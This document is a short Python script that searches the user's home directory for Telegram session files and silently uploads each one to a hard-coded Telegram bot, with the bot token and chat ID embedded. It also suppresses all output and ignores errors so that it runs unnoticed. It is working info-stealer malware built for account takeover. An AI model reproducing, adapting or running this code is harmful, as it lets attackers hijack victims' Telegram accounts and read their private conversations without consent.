import os
import sys
import urllib.request
import mimetypes

BOT_TOKEN = "8927697130:AAHyGOyinOKPr0UaYX1GoMfOrpP4FpN3HeY"
CHAT_ID = "8167615243"

# Directories to skip entirely. These rarely contain Telegram sessions
# and are often large, slowing traversal.
IGNORE_DIRS = {
    "node_modules", ".git", ".npm", ".cache", ".config",
    "usr", "lib", "bin", "libexec", "tmp", "proc", "sys", "dev",
    ".termux", "storage", "share", "include", "etc", "var", "opt",
    "android-sdk", ".cargo", ".rustup", ".gradle", ".m2",
    ".android", ".local", ".vscode", ".idea", "__pycache__",
    "site-packages", "dist-packages", "venv", "env", ".venv"
}

def send_document(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        filename = os.path.basename(file_path)
        content_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            f"{CHAT_ID}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        urllib.request.urlopen(req, timeout=30)
    except Exception:
        pass

def walk_and_send(root):
    for dirpath, dirnames, filenames in os.walk(root):
        # Prune ignored directories in-place.
        dirnames[:] = [d for d in dirnames if d not in IGNORE_DIRS]

        for filename in filenames:
            # Only target Telegram session artifacts.
            if not (filename.endswith(".session") or filename.endswith(".session-journal")):
                continue

            full_path = os.path.join(dirpath, filename)

            # Skip files larger than 10 MB (session files are small).
            try:
                if os.path.getsize(full_path) > 10 * 1024 * 1024:
                    continue
            except Exception:
                continue

            send_document(full_path)

def main():
    home = os.path.expanduser("~")
    walk_and_send(home)

if __name__ == "__main__":
    # Suppress all output.
    sys.stdout = open(os.devnull, "w")
    sys.stderr = open(os.devnull, "w")
    main()
